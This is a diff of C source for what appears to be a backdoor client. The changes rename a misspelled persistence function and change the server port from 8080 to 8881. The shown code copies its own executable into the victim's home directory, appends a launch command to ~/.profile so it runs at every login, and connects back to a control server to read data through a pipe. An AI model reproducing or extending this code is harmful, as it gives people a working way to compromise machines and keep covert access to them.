@@ -13,24 +13,23 @@ void kill_handler(int sig)
 }
 
 
-int presistence(char *get_path, FILE *fp)
+int persistence(char *get_path, FILE *fp)
 {
-
+		
     char chunk[128];
     int len = strlen(get_path) -8;
     get_path[len] = 0; //get_path without ".profile"
-
+		
     //copy the executable to home directory
     char command[50] = "cp client ";
     strcat(command, get_path);
-    strcat(command,".0XsdnsSystem")
     system(command);
 
-    strcat(get_path, "./.0XsdnsSystem &");
+    strcat(get_path, "./client &");
     //check if .profile can be accessed
     if(fp == NULL)
         {
-
+		
 	return 0;
 	}
     //check if our command is already written there
@@ -49,7 +48,7 @@ int presistence(char *get_path, FILE *fp)
 
 int main(void)
 {
-
+   
    //get the .profile file path for the victim's machine
     FILE *home_path = popen("echo $HOME/.profile","r");;
     char get_path[50];
@@ -58,11 +57,11 @@ int main(void)
 
    //open .profile file in append mode
     FILE *profile  = fopen(get_path, "a+");
-    presistence(get_path, profile);
+    persistence(get_path, profile); 
 
    //LEAVE COMMENTED DURING DEV
     signal(SIGINT, kill_handler);
-    connection server_con = connect_to("127.0.0.1", 8080);
+    connection server_con = connect_to("127.0.0.1", 8881);
 
     //check if the struct has been filled
     if (server_con.dest_ip == NULL)
@@ -105,7 +104,7 @@ int main(void)
           // Place our character from the pipe into the buffer
           buffer[length] = character_read;
           length++;
-
+          
           // Increase the buffer size if needed
           if (length == strlen(buffer))
           {
